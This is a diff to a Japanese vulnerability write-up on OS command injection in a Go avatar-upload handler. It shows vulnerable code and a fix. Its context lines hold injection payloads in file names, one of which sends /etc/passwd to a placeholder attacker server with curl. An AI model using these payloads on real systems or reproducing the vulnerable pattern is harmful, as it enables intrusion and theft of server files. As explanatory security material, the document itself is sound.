@@ -3,6 +3,8 @@
 ## 脆弱性の概要
 アバターアップロード機能において、ユーザーが指定したファイルIDがウィルススキャン処理で適切にエスケープされずにOSコマンドに渡されるため、OSコマンドインジェクションの脆弱性が存在します。攻撃者はこの脆弱性を悪用して、サーバー上で任意のコマンドを実行することができます。
 
+アバター画像データはデータベースに直接保存されますが、ウィルススキャンのために一時的にファイルシステムに保存される際に脆弱性が発生します。
+
 ## 影響
 この脆弱性が悪用された場合、以下のような影響があります：
 - サーバー上での任意のコマンド実行
@@ -17,8 +19,32 @@
    - `avatar.jpg && cat /etc/passwd`
    - `avatar.jpg | curl -X POST -d @/etc/passwd https://攻撃者のサーバー/`
 
+## 実装の詳細
+アバター画像データはBase64エンコードされた形式でデータベースに直接保存されます。ただし、ウィルススキャンを行うために、一時的にファイルシステムに保存されます。この一時ファイルは処理完了後に削除されますが、ウィルススキャン処理中に脆弱性が発生します。
+
 ## 脆弱なコード
 ```go
+func (h *Handler) UploadAvatar(c *gin.Context) {
+    // ... 省略 ...
+    
+    // 一時ファイルの保存（ウィルススキャン用）
+    filePath := filepath.Join(uploadDir, req.FileID)
+    if err := os.WriteFile(filePath, imageData, 0644); err != nil {
+        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save temporary file"})
+        return
+    }
+    defer os.Remove(filePath) // 処理完了後に一時ファイルを削除
+
+    // 脆弱性: OSコマンドインジェクション
+    // ユーザー入力（FileID）を適切にエスケープせずにコマンドに渡している
+    if err := scanFile(filePath); err != nil {
+        c.JSON(http.StatusBadRequest, gin.H{"error": "Virus detected or scan failed"})
+        return
+    }
+    
+    // ... 省略 ...
+}
+
 func scanFile(filePath string) error {
     // 脆弱性: OSコマンドインジェクション
     // ユーザー入力（filePath）を適切にエスケープせずにコマンドに渡している
@@ -45,7 +71,35 @@ func scanFile(filePath string) error {
 
 ### 修正例
 ```go
-func scanFile(filePath string) error {
+// データベースに直接保存する実装
+func (h *Handler) UploadAvatar(c *gin.Context) {
+    // ... 省略 ...
+    
+    // 一時ファイルを作成せずにメモリ上でスキャン
+    // または、一時ファイルを作成する場合は安全なファイル名を使用
+    tempFile, err := os.CreateTemp("", "safe-prefix-*.jpg")
+    if err != nil {
+        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temporary file"})
+        return
+    }
+    defer os.Remove(tempFile.Name())
+    
+    if _, err := tempFile.Write(imageData); err != nil {
+        c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write to temporary file"})
+        return
+    }
+    tempFile.Close()
+    
+    // 安全なスキャン処理
+    if err := scanFileSafely(tempFile.Name()); err != nil {
+        c.JSON(http.StatusBadRequest, gin.H{"error": "Virus detected or scan failed"})
+        return
+    }
+    
+    // ... 省略 ...
+}
+
+func scanFileSafely(filePath string) error {
     // 修正: 引数を配列として渡し、シェルを介さずに実行
     cmd := exec.Command("grep", "-q", "virus_signature", filePath)
     err := cmd.Run()
